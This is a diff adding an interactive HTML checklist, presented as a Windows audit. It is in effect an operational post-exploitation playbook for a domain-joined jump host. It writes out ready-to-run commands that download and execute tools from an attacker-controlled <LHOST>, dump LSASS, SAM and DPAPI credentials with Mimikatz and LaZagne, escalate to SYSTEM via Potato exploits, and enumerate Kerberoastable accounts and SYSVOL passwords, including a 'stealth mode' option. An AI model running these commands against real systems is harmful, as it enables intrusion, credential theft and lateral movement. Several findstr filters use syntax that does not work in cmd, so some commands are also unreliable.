@@ -1,0 +1,1224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Windows Audit Checklist</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#ffffff;--bg2:#f7f7f5;--bg3:#f0efe9;
+  --border:rgba(0,0,0,0.11);--border2:rgba(0,0,0,0.20);
+  --text:#1a1a18;--text2:#5a5a56;--text3:#8a8a84;
+  --mono:'Fira Mono','Cascadia Code','Consolas',monospace;
+  --sans:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+  --green:#1D9E75;--green-bg:#e1f5ee;
+  --purple-bg:#EEEDFE;--purple-text:#3C3489;
+  --amber-bg:#FAEEDA;--amber-text:#854F0B;
+  --blue-bg:#E6F1FB;--blue-text:#185FA5;
+}
+@media(prefers-color-scheme:dark){
+  :root{
+    --bg:#1c1c1a;--bg2:#252522;--bg3:#2e2e2b;
+    --border:rgba(255,255,255,0.09);--border2:rgba(255,255,255,0.18);
+    --text:#e8e6df;--text2:#a8a69f;--text3:#6a6a64;
+    --green-bg:#04342C;
+    --purple-bg:#26215C;--purple-text:#CECBF6;
+    --amber-bg:#2e2010;--amber-text:#fac775;
+    --blue-bg:#0e1e30;--blue-text:#85b7eb;
+  }
+}
+body{font-family:var(--sans);background:var(--bg);color:var(--text);font-size:14px;line-height:1.6}
+.page{max-width:860px;margin:0 auto;padding:32px 20px 120px}
+h1{font-size:19px;font-weight:600;margin-bottom:3px}
+.sub{font-size:12px;color:var(--text3);margin-bottom:20px}
+.tools-strip{background:var(--bg2);border:0.5px solid var(--border2);border-radius:8px;padding:14px 16px;margin-bottom:22px}
+.tools-strip h2{font-size:11px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.07em;margin-bottom:10px}
+.tools-grid{display:flex;flex-direction:column;gap:7px}
+.tool-row{display:flex;align-items:baseline;gap:8px;flex-wrap:wrap}
+.tool-name{font-size:12px;font-weight:600;color:var(--text);min-width:90px;flex-shrink:0}
+.tool-desc{font-size:12px;color:var(--text2)}
+.tool-url{font-size:11px;color:var(--text3);font-family:var(--mono);word-break:break-all;padding-left:2px}
+.tool-tag{display:inline-block;font-size:10px;padding:1px 7px;border-radius:9px;font-weight:500;background:var(--purple-bg);color:var(--purple-text);margin-left:4px;vertical-align:middle}
+.summary{display:flex;gap:10px;margin-bottom:18px;align-items:center;flex-wrap:wrap}
+.prog-wrap{flex:1;min-width:160px}
+.prog-bar{height:4px;background:var(--border2);border-radius:2px;overflow:hidden;margin-bottom:4px}
+.prog-fill{height:4px;background:var(--green);border-radius:2px;transition:width .3s}
+.prog-lbl{font-size:11px;color:var(--text3)}
+.tbtn{font-size:11px;padding:5px 13px;border-radius:7px;border:0.5px solid var(--border2);background:transparent;color:var(--text2);cursor:pointer;font-family:var(--sans);white-space:nowrap}
+.tbtn:hover{background:var(--bg2)}
+.section-hdr{font-size:11px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.07em;padding:20px 0 6px;border-bottom:0.5px solid var(--border);margin-bottom:2px}
+.step{display:flex;gap:10px;align-items:flex-start;padding:10px 0;border-bottom:0.5px solid var(--border)}
+.step.done .stitle{text-decoration:line-through;color:var(--text3)}
+.step-cb{width:16px;height:16px;min-width:16px;border-radius:4px;border:1.5px solid var(--border2);cursor:pointer;margin-top:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .12s}
+.step-cb:hover{border-color:var(--green)}
+.step-cb.on{background:var(--green);border-color:var(--green)}
+.step-cb.on::after{content:'';display:block;width:3px;height:6px;border:2px solid #fff;border-top:none;border-left:none;transform:rotate(45deg) translateY(-1px)}
+.num{font-size:11px;color:var(--text3);min-width:22px;margin-top:3px;font-variant-numeric:tabular-nums;flex-shrink:0}
+.body{flex:1;min-width:0}
+.stitle{font-size:13px;font-weight:500;cursor:pointer;margin-bottom:3px}
+.stitle:hover{color:var(--green)}
+.why-text{font-size:12px;color:var(--text3);font-style:italic;margin-bottom:4px;line-height:1.5}
+.look{font-size:12px;color:var(--text2);margin-bottom:6px;line-height:1.5}
+.root-badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:9px;font-weight:500;background:var(--amber-bg);color:var(--amber-text);margin-left:6px;vertical-align:middle}
+.low-badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:9px;font-weight:500;background:var(--blue-bg);color:var(--blue-text);margin-left:6px;vertical-align:middle}
+.cmds{display:flex;flex-direction:column;gap:3px;margin-bottom:8px}
+.cmd-row{display:flex;gap:6px;align-items:flex-start}
+.cmd-cb{width:13px;height:13px;min-width:13px;border-radius:3px;border:1.5px solid var(--border2);cursor:pointer;margin-top:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .12s}
+.cmd-cb:hover{border-color:var(--green)}
+.cmd-cb.on{background:var(--green);border-color:var(--green)}
+.cmd-cb.on::after{content:'';display:block;width:2px;height:5px;border:1.5px solid #fff;border-top:none;border-left:none;transform:rotate(45deg) translateY(-1px)}
+.code{flex:1;font-family:var(--mono);font-size:11px;background:var(--bg3);border:0.5px solid var(--border);border-radius:5px;padding:5px 9px;line-height:1.6;word-break:break-all;white-space:pre-wrap;overflow-wrap:anywhere;color:var(--text);display:block}
+.code.cmd-done{opacity:0.5;text-decoration:line-through}
+.cmt{font-size:11px;color:var(--text3);font-style:italic;padding:2px 0 1px 19px}
+.cpbtn{font-size:10px;padding:4px 9px;border-radius:5px;border:0.5px solid var(--border2);background:transparent;color:var(--text2);cursor:pointer;font-family:var(--sans);white-space:nowrap;flex-shrink:0;margin-top:1px}
+.cpbtn:hover{background:var(--bg2)}
+.cpbtn.ok{color:var(--green);border-color:var(--green)}
+.out-wrap{display:flex;flex-direction:column;gap:6px;margin-top:2px}
+.out-block{display:flex;flex-direction:column;gap:3px}
+.out-label{font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.05em}
+.output-field{
+  width:100%;font-family:var(--mono);font-size:11px;
+  background:var(--bg2);border:0.5px solid var(--border2);border-radius:5px;
+  padding:7px 9px;color:var(--text);resize:vertical;min-height:54px;
+  line-height:1.6;outline:none;transition:border-color .15s;
+}
+.output-field:focus{border-color:var(--green)}
+.output-field::placeholder{color:var(--text3)}
+.action-bar{position:sticky;bottom:0;background:var(--bg);border-top:0.5px solid var(--border2);padding:12px 0;margin-top:24px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.export-btn{font-size:12px;font-weight:500;padding:7px 16px;border-radius:7px;border:0.5px solid var(--green);background:var(--green-bg);color:var(--green);cursor:pointer;font-family:var(--sans);white-space:nowrap;transition:all .15s}
+.export-btn:hover{background:var(--green);color:#fff}
+.import-btn{font-size:12px;font-weight:500;padding:7px 16px;border-radius:7px;border:0.5px solid var(--border2);background:transparent;color:var(--text2);cursor:pointer;font-family:var(--sans);white-space:nowrap}
+.import-btn:hover{background:var(--bg2)}
+.bar-note{font-size:11px;color:var(--text3);margin-left:4px}
+#import-input{display:none}
+@media print{
+  .action-bar,.cpbtn,.step-cb,.cmd-cb,.tbtn,.out-label button{display:none!important}
+  .step{break-inside:avoid}
+  .page{padding:16px;max-width:100%}
+  .output-field{border:0.5px solid #ccc;min-height:40px;resize:none}
+  .section-hdr{padding-top:12px}
+  h1{font-size:16px}
+  .tools-strip{border:0.5px solid #ccc}
+  a{color:inherit;text-decoration:none}
+}
+</style>
+</head>
+<body>
+<div class="page">
+
+  <h1>Windows Audit Checklist</h1>
+  <div class="sub">Steps in execution order. Check off as you go. Per-command checkboxes track individual execution. Output fields save automatically. Export to Markdown when done.</div>
+
+  <div class="tools-strip">
+    <h2>Tools</h2>
+    <div class="tools-grid">
+      <div class="tool-row">
+        <span class="tool-name">WinPEAS</span>
+        <span class="tool-desc">Broadest automated Windows privilege escalation sweep — services, registry, credentials, scheduled tasks, network, and more.</span>
+        <span class="tool-tag">First drop</span>
+      </div>
+      <div class="tool-url">https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe</div>
+      <div class="tool-row">
+        <span class="tool-name">PowerUp</span>
+        <span class="tool-desc">PowerShell-based privilege escalation checker — service misconfigs, unquoted paths, AlwaysInstallElevated, registry autoruns.</span>
+      </div>
+      <div class="tool-url">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</div>
+      <div class="tool-row">
+        <span class="tool-name">Seatbelt</span>
+        <span class="tool-desc">Situational awareness and host triage — collects system info, credentials, browser data, tokens, and security configurations.</span>
+      </div>
+      <div class="tool-url">https://github.com/GhostPack/Seatbelt</div>
+      <div class="tool-row">
+        <span class="tool-name">SharpHound</span>
+        <span class="tool-desc">Active Directory enumeration and attack path collection for BloodHound. Maps AD relationships, ACLs, and privilege escalation paths.</span>
+      </div>
+      <div class="tool-url">https://github.com/BloodHoundAD/SharpHound</div>
+      <div class="tool-row">
+        <span class="tool-name">Mimikatz</span>
+        <span class="tool-desc">Credential extraction — LSASS dump, pass-the-hash, pass-the-ticket, token manipulation, DPAPI secrets.</span>
+      </div>
+      <div class="tool-url">https://github.com/gentilkiwi/mimikatz</div>
+      <div class="tool-row">
+        <span class="tool-name">LaZagne</span>
+        <span class="tool-desc">Credential recovery from browsers, applications, Windows vaults, and credential manager without requiring LSASS access.</span>
+      </div>
+      <div class="tool-url">https://github.com/AlessandroZ/LaZagne</div>
+    </div>
+  </div>
+
+  <div class="summary">
+    <div class="prog-wrap">
+      <div class="prog-bar"><div class="prog-fill" id="pf" style="width:0%"></div></div>
+      <div class="prog-lbl" id="pl">0 / 0 complete</div>
+    </div>
+    <button class="tbtn" onclick="resetAll()">Reset</button>
+  </div>
+
+  <div id="list"></div>
+
+  <div id="refs-section" style="margin-top:32px;padding-top:20px;border-top:0.5px solid var(--border2)">
+    <div style="font-size:11px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.07em;margin-bottom:12px">References</div>
+    <div id="refs-list"></div>
+  </div>
+
+  <div class="action-bar">
+    <button class="export-btn" onclick="exportMd()">Export to Markdown</button>
+    <button class="export-btn" onclick="exportPdf()" style="background:var(--bg2);border-color:var(--border2);color:var(--text2)">Export to PDF</button>
+    <label style="display:flex;align-items:center;gap:7px;cursor:pointer;font-size:12px;color:var(--text2);user-select:none">
+      <div id="redact-track" onclick="toggleRedact()" style="position:relative;width:32px;height:18px;background:var(--green);border-radius:9px;transition:background .2s;flex-shrink:0;cursor:pointer">
+        <span id="redact-thumb" style="position:absolute;top:2px;left:14px;width:14px;height:14px;background:#fff;border-radius:50%;transition:left .2s"></span>
+      </div>
+      Redact credentials on export
+    </label>
+    <button class="import-btn" onclick="document.getElementById('import-input').click()">Import Markdown</button>
+    <input type="file" id="import-input" accept=".md,text/markdown,text/plain" onchange="importMd(event)">
+    <span class="bar-note">Progress is auto-saved in browser on every change.</span>
+  </div>
+
+</div>
+<script>
+// ── Data ───────────────────────────────────────────────
+// priv: 'both' = run as low-priv user AND admin (separate output fields)
+//        'admin' = only useful / possible as administrator
+//        'low'   = works as low-priv user (single output field)
+const TOOLS_DATA = [
+{section:"Tool Runs"},
+
+{tid:"t1", title:"WinPEAS",
+why:"WinPEAS is the broadest automated Windows privilege escalation sweep. It checks services, registry keys, stored credentials, scheduled tasks, unquoted paths, AlwaysInstallElevated, and much more. Run first as your current low-priv user, then again as administrator if you escalate — the output changes significantly with elevated access.",
+priv:"both",
+cmds:[
+  {comment:"Download and run — output saved to file for later review"},
+  {c:"certutil.exe -urlcache -split -f https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe"},
+  {c:"C:\\Windows\\Temp\\winpeas.exe > C:\\Windows\\Temp\\winpeas.txt 2>&1"},
+  {c:"type C:\\Windows\\Temp\\winpeas.txt | findstr /i \"password\\|credential\\|token\\|privilege\\|administrator\\|SYSTEM\""}
+]},
+
+{tid:"t2", title:"PowerUp",
+why:"PowerUp identifies common Windows privilege escalation vectors — misconfigured service permissions, unquoted service paths, weak registry ACLs, AlwaysInstallElevated, and modifiable autoruns. It is PowerShell-based and does not require a compiled binary, making it easier to transfer to a restricted environment.",
+priv:"low",
+cmds:[
+  {comment:"Bypass execution policy for this session if needed"},
+  {c:"powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1'); Invoke-AllChecks\""},
+  {c:"powershell.exe -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks | Out-File C:\\Windows\\Temp\\powerup.txt\""},
+  {c:"type C:\\Windows\\Temp\\powerup.txt | findstr /i \"abuse\\|exploit\\|vulnerable\\|modifiable\\|unquoted\""}
+]},
+
+{tid:"t3", title:"Seatbelt",
+why:"Seatbelt collects situational awareness data across dozens of categories — system info, user context, mapped drives, network configuration, running processes, installed products, browser credentials, DPAPI blobs, RDP sessions, and security product status. Run as low-priv for user-context data, and as admin for system-wide triage.",
+priv:"both",
+cmds:[
+  {comment:"Full triage run — collects everything Seatbelt can reach"},
+  {c:"Seatbelt.exe -group=all > C:\\Windows\\Temp\\seatbelt.txt 2>&1"},
+  {comment:"Targeted credential-focused run"},
+  {c:"Seatbelt.exe CredEnum WindowsCredentialFiles DpapiMasterKeys InterestingFiles > C:\\Windows\\Temp\\seatbelt_creds.txt 2>&1"},
+  {c:"type C:\\Windows\\Temp\\seatbelt.txt | findstr /i \"password\\|credential\\|token\\|RDP\\|interesting\""}
+]},
+
+{tid:"t4", title:"SharpHound",
+why:"SharpHound collects Active Directory data for BloodHound analysis — group memberships, ACLs, GPO links, session information, and trust relationships. It maps privilege escalation and lateral movement paths through the AD environment that are invisible from manual enumeration. The data is imported into BloodHound on your attack machine for analysis.",
+priv:"low",
+cmds:[
+  {comment:"Collect all AD data types"},
+  {c:"SharpHound.exe -c All --outputdirectory C:\\Windows\\Temp\\"},
+  {comment:"Collect session data separately (noisier — generates logon events)"},
+  {c:"SharpHound.exe -c Session --loop --loopduration 02:00:00 --outputdirectory C:\\Windows\\Temp\\"},
+  {comment:"Stealth mode — reduced noise, skips session enumeration"},
+  {c:"SharpHound.exe -c DCOnly --outputdirectory C:\\Windows\\Temp\\"}
+]},
+
+{tid:"t5", title:"Mimikatz",
+why:"Mimikatz extracts plaintext passwords, NTLM hashes, Kerberos tickets, and DPAPI secrets from LSASS memory and the Windows credential store. Requires administrator or SYSTEM privileges and SeDebugPrivilege. Essential after privilege escalation to gather credentials for lateral movement.",
+priv:"admin",
+cmds:[
+  {comment:"Requires administrator — dump LSASS credentials"},
+  {c:"mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > C:\\Windows\\Temp\\mimi.txt"},
+  {comment:"Kerberos ticket extraction"},
+  {c:"mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\""},
+  {comment:"SAM database dump (local hashes)"},
+  {c:"mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\" > C:\\Windows\\Temp\\mimi_sam.txt"},
+  {comment:"DPAPI master key and credential decryption"},
+  {c:"mimikatz.exe \"privilege::debug\" \"dpapi::cred /in:C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Credentials\\*\" \"exit\""}
+]},
+
+{tid:"t6", title:"LaZagne",
+why:"LaZagne recovers passwords stored by applications — browsers (Chrome, Firefox, IE, Edge), putty/WinSCP sessions, Windows credential manager, VPN clients, and more. Unlike Mimikatz it does not require LSASS access, making it viable at lower privilege levels. Run as the current user to extract application-stored credentials.",
+priv:"both",
+cmds:[
+  {comment:"Dump all credentials the current user context can access"},
+  {c:"laZagne.exe all > C:\\Windows\\Temp\\lazagne.txt 2>&1"},
+  {comment:"Browser credentials only"},
+  {c:"laZagne.exe browsers > C:\\Windows\\Temp\\lazagne_browsers.txt 2>&1"},
+  {c:"type C:\\Windows\\Temp\\lazagne.txt | findstr /i \"password\\|login\\|credential\""}
+]},
+];
+
+const DATA = [
+
+{section:"System & Identity"},
+
+{id:1, priv:"low",
+title:"Get system and OS information",
+why:"Establishes the baseline — OS version, architecture, patch level, and hostname. The Windows version determines which local privilege escalation CVEs apply (e.g. PrintNightmare, HiveNightmare, EfsPotato). The hostname and domain membership define the target's role in the network.",
+look:"Look for: Unpatched OS versions. Domain membership — a domain-joined jump host opens AD attack paths. Remote Desktop Services role indicates this is a primary lateral movement pivot.",
+cmds:[
+  {c:"systeminfo"},
+  {c:"systeminfo | findstr /i \"OS Name\\|OS Version\\|System Type\\|Domain\\|Hotfix\""},
+  {c:"wmic os get Caption,CSDVersion,OSArchitecture,Version /value"},
+  {c:"hostname && whoami && whoami /all"}
+]},
+
+{id:2, priv:"low",
+title:"Enumerate current user privileges and groups",
+why:"The current user's privileges and group memberships determine the attack surface. SeImpersonatePrivilege is exploitable with potato attacks. SeBackupPrivilege allows reading any file. SeDebugPrivilege enables LSASS dumping. Membership in Remote Desktop Users, Administrators, or Backup Operators all open different escalation paths.",
+look:"Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege. Membership in Administrators, Backup Operators, Remote Desktop Users, Server Operators.",
+cmds:[
+  {c:"whoami /all"},
+  {c:"whoami /priv"},
+  {c:"whoami /groups"},
+  {c:"net user %username%"},
+  {c:"net localgroup administrators"}
+]},
+
+{id:3, priv:"low",
+title:"Enumerate all local users and groups",
+why:"Local accounts on a jump host may have weak or reused passwords, or may be shared admin accounts left by previous administrators. Disabled accounts can sometimes be re-enabled. Local groups reveal who has elevated access and what remote access is permitted.",
+look:"Look for: Disabled administrator accounts that could be re-enabled. Accounts with no password expiry. Unexpected accounts not belonging to the organisation. Multiple members of local Administrators group.",
+cmds:[
+  {c:"net user"},
+  {c:"net localgroup"},
+  {c:"net localgroup administrators"},
+  {c:"net localgroup \"Remote Desktop Users\""},
+  {c:"wmic useraccount get Name,Disabled,PasswordExpires,SID /format:list"}
+]},
+
+{id:4, priv:"low",
+title:"Check domain membership and domain controllers",
+why:"A domain-joined jump host is a foothold into the Active Directory environment. Identifying domain controllers and the domain name is the first step toward AD enumeration. Jump hosts often have elevated domain permissions granted for administration purposes.",
+look:"Look for: Domain name and DC hostnames for targeting. Domain admin accounts logged into this host. Trust relationships between domains.",
+cmds:[
+  {c:"systeminfo | findstr /i \"domain\""},
+  {c:"echo %userdomain% && echo %logonserver%"},
+  {c:"nltest /dsgetdc:%userdomain%"},
+  {c:"net group \"Domain Controllers\" /domain 2>nul"},
+  {c:"wmic ntdomain get DomainName,DomainControllerName,DomainControllerAddress /format:list"}
+]},
+
+{section:"Privilege Escalation"},
+
+{id:5, priv:"low",
+title:"Check AlwaysInstallElevated registry keys",
+why:"If both HKLM and HKCU AlwaysInstallElevated keys are set to 1, any user can install MSI packages as SYSTEM. This is a trivially exploitable misconfiguration — a malicious MSI can execute arbitrary commands as SYSTEM.",
+look:"Look for: Both keys returning 0x1. If both are set, the system is vulnerable to MSI privilege escalation.",
+cmds:[
+  {c:"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"},
+  {c:"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"}
+]},
+
+{id:6, priv:"low",
+title:"Enumerate services with weak permissions",
+why:"Windows services running as SYSTEM with weak binary or configuration permissions allow privilege escalation by replacing the binary or modifying the service configuration. Unquoted service paths with spaces allow DLL/binary planting without needing to modify the service directly.",
+look:"Look for: Services with BINARY_PATH_NAME containing unquoted paths with spaces. SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG granted to non-admin groups. Writable service binary paths.",
+cmds:[
+  {c:"wmic service get Name,PathName,StartMode,State /format:list"},
+  {c:"sc query type= all state= all"},
+  {comment:"Find unquoted service paths with spaces"},
+  {c:"wmic service get name,pathname | findstr /i /v \"C:\\\\Windows\\\\\" | findstr /i /v \"\\\"\""},
+  {comment:"Check service permissions (requires accesschk from Sysinternals)"},
+  {c:"accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula 2>nul"},
+  {c:"accesschk.exe -uwcqv \"Everyone\" * /accepteula 2>nul"}
+]},
+
+{id:7, priv:"low",
+title:"Check scheduled tasks for privilege escalation",
+why:"Scheduled tasks running as SYSTEM or Administrator with writable task binary paths allow privilege escalation without touching services. Custom tasks created by administrators often have weaker permissions than built-in tasks.",
+look:"Look for: Tasks running as SYSTEM or Administrator with world-writable binary paths. Tasks executing scripts from writable directories. Tasks with weak ACLs on the task definition itself.",
+cmds:[
+  {c:"schtasks /query /fo LIST /v"},
+  {c:"schtasks /query /fo LIST /v | findstr /i \"Task To Run\\|Run As User\\|Status\""},
+  {comment:"PowerShell for cleaner output"},
+  {c:"powershell.exe -c \"Get-ScheduledTask | Where-Object {$_.Principal.UserId -match 'SYSTEM|Administrator'} | Select-Object TaskName,TaskPath,@{n='Command';e={$_.Actions.Execute}} | Format-List\""}
+]},
+
+{id:8, priv:"low",
+title:"Check registry autoruns and startup locations",
+why:"Programs in registry autorun keys and startup folders execute on every user login or system boot. Writable paths in these locations allow persistence and privilege escalation if the autorun runs in a higher-privilege context.",
+look:"Look for: Autorun entries pointing to writable directories. Entries running from user-writable paths like %APPDATA% or %TEMP%. Non-standard entries not matching installed software.",
+cmds:[
+  {c:"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"},
+  {c:"reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"},
+  {c:"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"},
+  {c:"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""},
+  {c:"dir \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""},
+  {c:"dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""}
+]},
+
+{id:9, priv:"low",
+title:"Check token privileges and impersonation potential",
+why:"SeImpersonatePrivilege is held by service accounts and is the basis for all Potato-family privilege escalation attacks (JuicyPotato, PrintSpoofer, RoguePotato, GodPotato). If present, escalation to SYSTEM is straightforward regardless of other hardening.",
+look:"Look for: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege listed as Enabled. Service accounts or IIS/SQL Server contexts are common. Any of these = direct SYSTEM escalation path available.",
+cmds:[
+  {c:"whoami /priv | findstr /i \"SeImpersonate\\|SeAssignPrimaryToken\\|SeCreateToken\\|SeTcb\""},
+  {comment:"Check if running under a service account context"},
+  {c:"whoami"},
+  {comment:"PrintSpoofer — works on Windows 10/Server 2019 with SeImpersonatePrivilege"},
+  {c:"PrintSpoofer.exe -i -c cmd 2>nul"},
+  {comment:"GodPotato — works on Windows Server 2012-2022"},
+  {c:"GodPotato.exe -cmd \"cmd /c whoami\" 2>nul"}
+]},
+
+{id:10, priv:"low",
+title:"Search for stored credentials and password files",
+why:"Administrators frequently leave credentials in plaintext files, scripts, configuration files, and registry keys on jump hosts. Common locations include deployment scripts, IIS web configs, PowerShell scripts, and backup configuration files.",
+look:"Look for: Plaintext passwords in any file. Passwords stored in registry under common software keys. Credential files from backup software, deployment tools, VNC, or remote management agents.",
+cmds:[
+  {comment:"Search common locations for plaintext passwords"},
+  {c:"findstr /si \"password\" C:\\*.txt C:\\*.xml C:\\*.ini C:\\*.config 2>nul | head"},
+  {c:"findstr /si \"password\" C:\\Users\\*.txt C:\\Users\\*.xml C:\\Users\\*.ini 2>nul"},
+  {comment:"Registry password searches"},
+  {c:"reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i \"password\""},
+  {c:"reg query HKCU /f password /t REG_SZ /s 2>nul | findstr /i \"password\""},
+  {comment:"Common application credential locations"},
+  {c:"type C:\\Windows\\System32\\config\\RegBack\\SAM 2>nul"},
+  {c:"dir C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\ /s /a 2>nul"},
+  {c:"cmdkey /list"}
+]},
+
+{id:11, priv:"low",
+title:"Check Windows Credential Manager and DPAPI",
+why:"Windows Credential Manager stores saved network credentials, RDP passwords, and application passwords protected with DPAPI. The current user's DPAPI master key can decrypt all credentials saved under their profile without requiring admin access.",
+look:"Look for: Saved RDP credentials for other hosts — these are immediate lateral movement paths. Domain account passwords stored for mapped drives or web applications. Certificates with exportable private keys.",
+cmds:[
+  {c:"cmdkey /list"},
+  {c:"vaultcmd /list"},
+  {c:"vaultcmd /listcreds:\"Windows Credentials\" /all"},
+  {c:"vaultcmd /listcreds:\"Web Credentials\" /all"},
+  {c:"dir C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Credentials\\ /a"},
+  {c:"dir C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Credentials\\ /a"},
+  {comment:"List DPAPI master keys"},
+  {c:"dir C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Protect\\ /a /s"}
+]},
+
+{id:12, priv:"both",
+title:"Check Windows Vault and stored RDP credentials",
+why:"RDP credentials saved in the Windows Vault represent direct lateral movement paths to other systems. As a low-priv user you can list vault contents. As an admin you can decrypt them using Mimikatz DPAPI modules or export them for offline cracking.",
+look:"Look for: RDP target hostnames stored in the vault — these are systems this jump host connects to. Domain credentials stored for other services. Any credential entry is a potential lateral movement path.",
+cmds:[
+  {c:"vaultcmd /listcreds:\"Windows Credentials\" /all"},
+  {c:"powershell.exe -c \"[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $vault = New-Object Windows.Security.Credentials.PasswordVault; $vault.RetrieveAll() | ForEach-Object {$_.RetrievePassword(); $_} | Select-Object UserName,Resource,Password | Format-List\""},
+  {comment:"Admin — decrypt with Mimikatz DPAPI"},
+  {c:"mimikatz.exe \"privilege::debug\" \"sekurlsa::credman\" \"exit\" 2>nul"}
+]},
+
+{section:"Active Directory Enumeration"},
+
+{id:13, priv:"low",
+title:"Enumerate domain users and privileged accounts",
+why:"Domain user enumeration identifies privileged accounts, service accounts with SPNs (Kerberoastable), and accounts with pre-auth disabled (AS-REP roastable). On a domain-joined jump host this is possible as any authenticated domain user without special privileges.",
+look:"Look for: Domain admin accounts. Service accounts with weak passwords (Kerberoasting targets). Accounts with 'Do not require Kerberos preauthentication' (AS-REP roasting targets). Accounts with AdminCount=1.",
+cmds:[
+  {c:"net user /domain"},
+  {c:"net group \"Domain Admins\" /domain"},
+  {c:"net group \"Enterprise Admins\" /domain"},
+  {c:"net group \"Schema Admins\" /domain"},
+  {c:"powershell.exe -c \"([adsisearcher]'(&(objectClass=user)(adminCount=1))').FindAll() | ForEach-Object {$_.Properties.samaccountname}\""},
+  {comment:"Find Kerberoastable accounts (have SPN set)"},
+  {c:"powershell.exe -c \"([adsisearcher]'(&(objectClass=user)(servicePrincipalName=*)(!samaccountname=krbtgt))').FindAll() | ForEach-Object {$_.Properties.samaccountname + ' - ' + $_.Properties.serviceprincipalname}\""},
+  {comment:"Find AS-REP roastable accounts"},
+  {c:"powershell.exe -c \"([adsisearcher]'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))').FindAll() | ForEach-Object {$_.Properties.samaccountname}\""}
+]},
+
+{id:14, priv:"low",
+title:"Enumerate domain groups and memberships",
+why:"Group memberships in AD determine what a compromised account can access. High-value groups beyond Domain Admins include Account Operators, Backup Operators, Print Operators, and custom delegated groups that may have silent admin-equivalent rights on specific OUs or resources.",
+look:"Look for: Non-obvious privileged groups with unexpected members. Custom groups with delegated rights over OUs or computer objects. Groups with GenericAll/GenericWrite ACLs over privileged accounts.",
+cmds:[
+  {c:"net group /domain"},
+  {c:"net group \"Domain Admins\" /domain"},
+  {c:"net group \"Backup Operators\" /domain"},
+  {c:"net group \"Account Operators\" /domain"},
+  {c:"net group \"Server Operators\" /domain"},
+  {c:"net group \"Group Policy Creator Owners\" /domain"},
+  {c:"powershell.exe -c \"([adsisearcher]'(objectClass=group)').FindAll() | ForEach-Object {$_.Properties.name} | Sort-Object\""}
+]},
+
+{id:15, priv:"low",
+title:"Enumerate domain computers and servers",
+why:"Knowing what systems exist in the domain identifies high-value targets — domain controllers, file servers, Exchange servers, ADCS servers, and other jump hosts. From a jump host you can typically reach internal systems that are not accessible from the attacker's initial position.",
+look:"Look for: Domain controllers (primary targets). Certificate Authority servers (ADCS — ESC attacks). Exchange servers (privilege escalation via RelayToEWS). File servers with accessible shares.",
+cmds:[
+  {c:"net view /domain"},
+  {c:"net group \"Domain Controllers\" /domain"},
+  {c:"powershell.exe -c \"([adsisearcher]'(objectClass=computer)').FindAll() | ForEach-Object {$_.Properties.name + ' - ' + $_.Properties.operatingsystem} | Sort-Object\""},
+  {comment:"Find servers specifically"},
+  {c:"powershell.exe -c \"([adsisearcher]'(&(objectClass=computer)(operatingSystem=*Server*))').FindAll() | ForEach-Object {$_.Properties.name + ' | ' + $_.Properties.operatingsystem + ' | ' + $_.Properties['ms-mcs-admpwdexpirationtime']}\""}
+]},
+
+{id:16, priv:"low",
+title:"Enumerate Group Policy Objects",
+why:"GPOs can contain embedded credentials in SYSVOL (cpassword — Groups.xml), configure security settings that affect privilege escalation viability, and reveal security policy exceptions. SYSVOL is readable by all authenticated domain users.",
+look:"Look for: cpassword values in SYSVOL Groups.xml files — these are AES-256 encrypted with the published Microsoft key and trivially decryptable. GPO-deployed scripts or software that run as SYSTEM. Disabled security controls via GPO.",
+cmds:[
+  {c:"powershell.exe -c \"Get-GPO -All 2>$null | Select-Object DisplayName,Id,GpoStatus\""},
+  {comment:"Search SYSVOL for cpassword (Group Policy Preferences passwords)"},
